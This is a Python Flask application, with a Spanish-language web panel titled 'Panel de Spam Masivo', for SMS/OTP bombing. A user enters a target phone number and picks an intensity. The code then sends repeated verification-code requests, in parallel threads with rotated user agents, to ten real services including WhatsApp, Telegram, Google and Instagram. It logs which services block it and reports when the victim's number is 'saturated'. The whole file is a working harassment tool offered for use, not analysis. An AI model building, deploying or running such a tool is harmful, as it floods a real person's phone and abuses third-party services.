from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

app = Flask(__name__)

# Estado global del ataque
attack_state = {
    "active": False,
    "number": "",
    "intensity": "high",
    "sent_count": 0,
    "success_count": 0,
    "blocked_count": 0,
    "failed_count": 0,
    "saturation_level": 0,
    "saturated": False,
    "start_time": None,
    "logs": [],
    "services_blocked": []
}

# Servicios OTP para spam
otp_services = [
    ("WhatsApp", "https://api.whatsapp.com/send", "get", "phone"),
    ("Telegram", "https://my.telegram.org/auth/send_password", "post", "phone"),
    ("Google", "https://accounts.google.com/signup/v2/webcreateaccount", "post", "phoneNumber"),
    ("Instagram", "https://www.instagram.com/api/v1/accounts/send_signup_sms_code/", "post", "phone_number"),
    ("Twitter", "https://api.twitter.com/1.1/onboarding/task.json", "post", "phone_number"),
    ("TikTok", "https://api.tiktok.com/passport/email/phone/send_code/", "post", "mobile"),
    ("LinkedIn", "https://www.linkedin.com/uas/request-password-reset-v2", "post", "phoneNumber"),
    ("Uber", "https://auth.uber.com/v2/api/send_otp", "post", "phone"),
    ("Amazon", "https://www.amazon.com/ap/register", "post", "phoneNumber"),
    ("Snapchat", "https://accounts.snapchat.com/accounts/send_phone_verification", "post", "phoneNumber")
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36"
]

def add_log(message, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    attack_state["logs"].append({
        "timestamp": timestamp,
        "message": message,
        "level": level
    })
    if len(attack_state["logs"]) > 50:
        attack_state["logs"] = attack_state["logs"][-50:]

def send_otp(number, service):
    name, url, method, phone_field = service
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json"
        }
        
        if method == "get":
            response = requests.get(url, params={phone_field: number}, headers=headers, timeout=3)
        else:
            response = requests.post(url, json={phone_field: number}, headers=headers, timeout=3)
        
        attack_state["sent_count"] += 1
        
        if response.status_code == 200:
            attack_state["success_count"] += 1
        elif response.status_code == 429:
            attack_state["blocked_count"] += 1
            if name not in attack_state["services_blocked"]:
                attack_state["services_blocked"].append(name)
                add_log(f"Servicio {name} bloqueado", "warning")
        else:
            attack_state["failed_count"] += 1
            
    except:
        attack_state["failed_count"] += 1

def update_saturation():
    if attack_state["sent_count"] > 10:
        block_rate = (attack_state["blocked_count"] / attack_state["sent_count"]) * 100
        
        if block_rate > 40:
            attack_state["saturation_level"] = 100
        elif block_rate > 30:
            attack_state["saturation_level"] = 80
        elif block_rate > 20:
            attack_state["saturation_level"] = 60
        elif block_rate > 10:
            attack_state["saturation_level"] = 40
        else:
            attack_state["saturation_level"] = min(30, int(block_rate * 3))
        
        if attack_state["saturation_level"] >= 80:
            attack_state["saturated"] = True
            add_log("¡NÚMERO SATURADO!", "success")

def attack_loop(number, intensity):
    delays = {"low": 5, "medium": 1.5, "high": 0.5, "max": 0.1}
    delay = delays.get(intensity, 0.5)
    
    add_log(f"Ataque iniciado contra {number}", "info")
    
    while attack_state["active"]:
        try:
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                attack_services = otp_services * 2
                
                for service in attack_services:
                    if not attack_state["active"]:
                        break
                    futures.append(executor.submit(send_otp, number, service))
                
                for future in futures:
                    future.result()
            
            update_saturation()
            time.sleep(delay)
            
        except Exception as e:
            add_log(f"Error: {str(e)[:50]}", "error")
            time.sleep(1)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Spam Masivo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 3px;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
            font-size: 2em;
        }
        
        .panel {
            background: #111111;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #00cc00;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            background: #000000;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            font-size: 16px;
        }
        
        input:focus, select:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .button-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 20px;
        }
        
        button {
            padding: 15px;
            background: #001100;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s;
            font-size: 16px;
        }
        
        button:hover {
            background: #00ff00;
            color: #000000;
            box-shadow: 0 0 20px #00ff00;
        }
        
        button:disabled {
            background: #1a1a1a;
            color: #444444;
            border-color: #444444;
            cursor: not-allowed;
        }
        
        button.stop-btn {
            border-color: #ff0000;
            color: #ff0000;
        }
        
        button.stop-btn:hover {
            background: #ff0000;
            color: #000000;
            box-shadow: 0 0 20px #ff0000;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 20px;
        }
        
        .stat-box {
            background: #000000;
            border: 1px solid #00ff00;
            padding: 15px;
            text-align: center;
            border-radius: 5px;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            margin-top: 5px;
        }
        
        .saturation-bar {
            margin-top: 20px;
            padding: 10px;
            background: #000000;
            border: 1px solid #00ff00;
        }
        
        .saturation-fill {
            height: 30px;
            background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
            transition: width 0.5s;
            border-radius: 3px;
        }
        
        .saturation-text {
            text-align: center;
            margin-top: 5px;
            font-weight: bold;
        }
        
        .log-container {
            background: #000000;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
            border-radius: 5px;
        }
        
        .log-entry {
            margin: 5px 0;
            padding: 5px;
            border-bottom: 1px solid #003300;
            font-size: 14px;
        }
        
        .log-info { color: #00ff00; }
        .log-warning { color: #ffff00; }
        .log-success { color: #00ffff; font-weight: bold; }
        .log-error { color: #ff0000; }
        
        .saturated-indicator {
            display: none;
            text-align: center;
            padding: 20px;
            background: #1a0000;
            border: 2px solid #ff0000;
            color: #ff0000;
            font-size: 1.5em;
            font-weight: bold;
            animation: blink 1s infinite;
            border-radius: 10px;
            margin-top: 20px;
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ Panel de Spam Masivo ⚡</h1>
        
        <div class="panel">
            <h2>Configuración de Ataque</h2>
            
            <div class="input-group">
                <label>Número Objetivo:</label>
                <input type="tel" id="targetNumber" placeholder="+34XXXXXXXXX" required>
            </div>
            
            <div class="input-group">
                <label>Intensidad:</label>
                <select id="intensity">
                    <option value="low">Baja (5 seg entre envíos)</option>
                    <option value="medium">Media (1.5 seg entre envíos)</option>
                    <option value="high" selected>Alta (0.5 seg entre envíos)</option>
                    <option value="max">Máxima (0.1 seg entre envíos)</option>
                </select>
            </div>
            
            <div class="button-group">
                <button id="startBtn" onclick="startAttack()">Iniciar Ataque</button>
                <button id="stopBtn" class="stop-btn" onclick="stopAttack()" disabled>Detener</button>
            </div>
        </div>
        
        <div class="panel">
            <h2>Estadísticas en Tiempo Real</h2>
            
            <div class="stats-grid">
                <div class="stat-box">
                    <div>SMS Enviados</div>
                    <div class="stat-value" id="sentCount">0</div>
                </div>
                <div class="stat-box">
                    <div>Exitosos</div>
                    <div class="stat-value" id="successCount">0</div>
                </div>
                <div class="stat-box">
                    <div>Bloqueados</div>
                    <div class="stat-value" id="blockedCount">0</div>
                </div>
                <div class="stat-box">
                    <div>Fallidos</div>
                    <div class="stat-value" id="failedCount">0</div>
                </div>
            </div>
            
            <div class="saturation-bar">
                <div>Nivel de Saturación:</div>
                <div class="saturation-fill" id="saturationFill" style="width: 0%"></div>
                <div class="saturation-text" id="saturationText">0%</div>
            </div>
            
            <div class="saturated-indicator" id="saturatedIndicator">
                ⚠️ ¡NÚMERO SATURADO! ⚠️
            </div>
        </div>
        
        <div class="panel">
            <h2>Logs de Ataque</h2>
            <div class="log-container" id="logContainer">
                <div class="log-entry log-info">[SISTEMA] Panel listo. Esperando instrucciones...</div>
            </div>
        </div>
    </div>
    
    <script>
        function log(message, level = 'info') {
            const logContainer = document.getElementById('logContainer');
            const entry = document.createElement('div');
            entry.className = `log-entry log-${level}`;
            entry.innerHTML = message;
            logContainer.appendChild(entry);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
        
        async function startAttack() {
            const number = document.getElementById('targetNumber').value;
            const intensity = document.getElementById('intensity').value;
            
            if (!number) {
                log('[ERROR] Introduce un número objetivo', 'error');
                return;
            }
            
            try {
                const response = await fetch('/api/start_attack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({number, intensity})
                });
                
                const data = await response.json();
                
                if (data.status === 'started') {
                    document.getElementById('startBtn').disabled = true;
                    document.getElementById('stopBtn').disabled = false;
                    log(`[ATAQUE] Iniciado contra ${number}`, 'warning');
                }
            } catch (error) {
                log(`[ERROR] ${error.message}`, 'error');
            }
        }
        
        async function stopAttack() {
            try {
                const response = await fetch('/api/stop_attack', {
                    method: 'POST'
                });
                
                const data = await response.json();
                
                if (data.status === 'stopped') {
                    document.getElementById('startBtn').disabled = false;
                    document.getElementById('stopBtn').disabled = true;
                    log('[SISTEMA] Ataque detenido', 'warning');
                }
            } catch (error) {
                log(`[ERROR] ${error.message}`, 'error');
            }
        }
        
        async function updateStats() {
            try {
                const response = await fetch('/api/get_status');
                const data = await response.json();
                
                document.getElementById('sentCount').textContent = data.sent_count;
                document.getElementById('successCount').textContent = data.success_count;
                document.getElementById('blockedCount').textContent = data.blocked_count;
                document.getElementById('failedCount').textContent = data.failed_count;
                
                const saturation = data.saturation_level;
                document.getElementById('saturationFill').style.width = saturation + '%';
                document.getElementById('saturationText').textContent = saturation + '%';
                
                const indicator = document.getElementById('saturatedIndicator');
                if (data.saturated) {
                    indicator.style.display = 'block';
                } else {
                    indicator.style.display = 'none';
                }
                
                if (data.logs && data.logs.length > 0) {
                    const logContainer = document.getElementById('logContainer');
                    logContainer.innerHTML = '';
                    
                    data.logs.forEach(logEntry => {
                        const entry = document.createElement('div');
                        entry.className = `log-entry log-${logEntry.level}`;
                        entry.innerHTML = `[${logEntry.timestamp}] ${logEntry.message}`;
                        logContainer.appendChild(entry);
                    });
                    
                    logContainer.scrollTop = logContainer.scrollHeight;
                }
                
            } catch (error) {
                console.error('Error updating stats:', error);
            }
        }
        
        setInterval(updateStats, 2000);
        updateStats();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    try:
        data = request.json
        number = data.get('number')
        intensity = data.get('intensity', 'high')
        
        if not number:
            return jsonify({"status": "error", "message": "Número requerido"}), 400
        
        attack_state["active"] = True
        attack_state["number"] = number
        attack_state["intensity"] = intensity
        attack_state["sent_count"] = 0
        attack_state["success_count"] = 0
        attack_state["blocked_count"] = 0
        attack_state["failed_count"] = 0
        attack_state["saturation_level"] = 0
        attack_state["saturated"] = False
        attack_state["start_time"] = datetime.now().isoformat()
        attack_state["logs"] = []
        attack_state["services_blocked"] = []
        
        thread = threading.Thread(target=attack_loop, args=(number, intensity))
        thread.daemon = True
        thread.start()
        
        return jsonify({"status": "started", "message": f"Ataque iniciado contra {number}"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/stop_attack', methods=['POST'])
def stop_attack():
    attack_state["active"] = False
    return jsonify({"status": "stopped", "message": "Ataque detenido"})

@app.route('/api/get_status')
def get_status():
    return jsonify(attack_state)

# Para Vercel
app.debug = False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)